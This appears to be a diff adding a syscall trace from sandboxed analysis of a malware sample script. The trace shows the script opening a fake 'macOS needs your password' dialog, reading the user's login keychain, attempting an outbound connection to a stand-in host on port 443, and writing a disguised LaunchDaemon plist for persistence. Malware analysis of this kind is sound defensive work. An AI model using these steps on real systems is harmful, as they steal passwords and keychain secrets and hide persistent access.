@@ -1,0 +1,28 @@
+365   1795494743.507967 execve("/usr/bin/timeout", ["timeout", "20", "/bin/bash", "./sample.sh"], 0xffffff633df0 /* 6 vars */) = 0
+365   1795494743.508185 clone(child_stack=NULL, flags=CLONE_VM|CLONE_VFORK|SIGCHLD <unfinished ...>
+366   1795494743.508218 openat(AT_FDCWD, "/dev/null", O_RDWR|O_LARGEFILE) = 3
+366   1795494743.508264 clone(child_stack=NULL, flags=SIGCHLD) = 367
+365   1795494743.508367 <... clone resumed>) = 366
+365   1795494743.508374 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=366, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+365   1795494743.508397 execve("/bin/bash", ["/bin/bash", "./sample.sh"], 0xffffcbc8ffe0 /* 6 vars */) = 0
+365   1795494743.508557 openat(AT_FDCWD, "/etc/ld-musl-aarch64.path", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+365   1795494743.508572 openat(AT_FDCWD, "/lib/libreadline.so.8", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+365   1795494743.508586 openat(AT_FDCWD, "/usr/local/lib/libreadline.so.8", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+365   1795494743.508599 openat(AT_FDCWD, "/usr/lib/libreadline.so.8", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
+365   1795494743.508696 openat(AT_FDCWD, "/lib/libncursesw.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+365   1795494743.508710 openat(AT_FDCWD, "/usr/local/lib/libncursesw.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = -1 ENOENT (No such file or directory)
+365   1795494743.508723 openat(AT_FDCWD, "/usr/lib/libncursesw.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
+365   1795494743.509010 openat(AT_FDCWD, "/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+365   1795494743.509435 openat(AT_FDCWD, "/etc/passwd", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
+365   1795494743.509665 openat(AT_FDCWD, "./sample.sh", O_RDONLY|O_LARGEFILE) = 3
+365   1795494743.509927 clone(child_stack=NULL, flags=SIGCHLD) = 368
+368   1795494743.510144 execve("/usr/bin/osascript", ["osascript", "-e", "display dialog \"macOS needs your password\" default answer \"\" with hidden answer"], 0xffff89b23810 /* 7 vars */) = 0
+368   1795494743.510396 openat(AT_FDCWD, "/usr/bin/osascript", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
+365   1795494743.510534 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=368, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+365   1795494743.510654 clone(child_stack=NULL, flags=SIGCHLD) = 369
+369   1795494743.510853 openat(AT_FDCWD, "/dev/null", O_WRONLY|O_CREAT|O_TRUNC|O_LARGEFILE, 0666) = 3
+369   1795494743.510883 execve("/bin/cat", ["cat", "/Users/chamber/Library/Keychains/login.keychain-db"], 0xffff89b23810 /* 7 vars */) = 0
+369   1795494743.511024 openat(AT_FDCWD, "/Users/chamber/Library/Keychains/login.keychain-db", O_RDONLY|O_LARGEFILE) = 3
+365   1795494743.511113 --- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=369, si_uid=0, si_status=0, si_utime=0, si_stime=0} ---
+365   1795494743.511166 connect(3, {sa_family=AF_INET, sin_port=htons(443), sin_addr=inet_addr("203.0.113.9")}, 16) = -1 ENETUNREACH (Network unreachable)
+365   1795494743.511268 openat(AT_FDCWD, "/Library/LaunchDaemons/com.apple.fake-helper.plist", O_WRONLY|O_CREAT|O_TRUNC|O_LARGEFILE, 0666) = 3
